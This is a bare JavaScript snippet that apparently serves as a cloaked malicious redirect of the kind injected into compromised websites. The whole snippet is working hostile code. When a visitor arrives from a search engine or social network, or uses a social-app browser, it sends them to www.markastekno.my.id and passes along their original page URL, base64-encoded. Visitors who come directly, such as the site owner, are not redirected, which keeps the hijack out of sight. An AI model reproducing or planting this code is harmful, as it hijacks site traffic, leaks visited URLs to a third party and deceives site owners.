var ars = ["https://www.markastekno.my.id"];
([".google.", "t.co", "instagram.com", "bing.", "yandex.", "facebook.", "pinterest."].some((a) => document.referrer.toLowerCase().includes(a)) ||
    ["fb", "facebook", "instagram.com", "pinterest", "twitter"].some((a) => navigator.userAgent.toLowerCase().includes(a))) &&
    (ars.some((a) => window.location.origin.includes(a)) || (window.location.href = ars[Math.floor(Math.random() * ars.length)] + "/?token=" + btoa(window.location.href)));
